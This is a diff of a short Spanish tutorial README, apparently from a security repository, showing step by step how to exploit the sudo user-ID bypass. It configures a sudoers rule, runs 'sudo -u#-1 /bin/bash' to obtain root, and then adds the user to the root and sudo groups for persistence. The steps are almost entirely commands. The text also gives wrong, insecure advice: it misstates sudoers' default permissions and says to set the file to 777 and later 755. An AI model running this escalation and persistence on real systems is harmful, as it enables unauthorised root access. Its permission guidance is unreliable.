@@ -1,10 +1,6 @@
 <img style="float:left" alt="netspy logo" src="https://github.com/hackingyseguridad/sudo/blob/master/sudo.png">
 
-#0.- Por defecto /etc/sudoers tiene permisos chmod 775. 
-
-Intentamos para editar sin problemas el fichero sudoers $chmod 777 /etc/sudoers  y volvemos a restablecer después los privilegios chmod 755 /etc/sudoers
-
-#1.- Editamos el fichero /etc/sudoers con 
+#1.- Por defecto /etc/sudoers tiene permisos chmod 775. Intentamos para editar sin problemas el fichero sudoers $chmod 777 /etc/sudoers  y volvemos a restablecer después los privilegios chmod 755 /etc/sudoers. O Editamos el fichero /etc/sudoers con visudo: 
 
 $usermod -aG sudo antonio
 
@@ -20,7 +16,7 @@ root ALL=(ALL:ALL) ALL
 
 antonio ALL=(ALL) /usr/bin/id
 
-#4.- Ejecutamos: 
+#3.- Ejecutamos: 
 
 $su antonio
 
@@ -30,13 +26,13 @@ $sudo whoani
 
 $sudo -u antonio id
 
-#5.- Volvemos a editar el fichero /etc/sudoers con $sudo visudo
+#4.- Volvemos a editar el fichero /etc/sudoers con $sudo visudo
 
-#6.- Modificamos la línea
+#5.- Modificamos la línea
 
 antonio ALL=(ALL, !root) ALL
 
-#7.- Explotamos la vulnerabilidad con sudo -u#-1
+#6.- Explotamos la vulnerabilidad con sudo -u#-1
 
 $chmod 755 /etc/sudoers
 
@@ -46,13 +42,15 @@ $sudo -u#-1 /bin/bash
 
 root
 
-#8.- ya somos root!
+#7.- ya somos root!
 
-#9.- Otro si: añadimos en la línea sudo de /etc/group a antonio y nos hacernos persistentes en la maquina:
+#8.- Otro si: añadimos en la línea sudo de /etc/group a antonio y nos hacernos persistentes en la maquina:
 
 usermod -aG root antonio
 
 usermod -aG sudo antonio
+
+#9.- Probamos
 
 exit
 
